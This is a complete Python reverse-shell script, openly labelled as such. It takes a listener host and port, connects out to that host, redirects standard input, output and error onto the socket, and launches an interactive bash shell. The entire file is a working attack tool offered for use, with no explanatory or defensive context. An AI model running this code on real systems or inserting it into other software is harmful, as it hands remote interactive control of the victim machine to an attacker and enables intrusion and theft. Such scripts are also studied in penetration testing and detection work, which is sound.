#!/usr/bin/env python3
# Python reverse shell
import socket,subprocess,os
import sys

if len(sys.argv) < 3:
    print("Usage: reverse-shell.py <LHOST> <LPORT>")
    sys.exit(1)

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((LHOST,LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
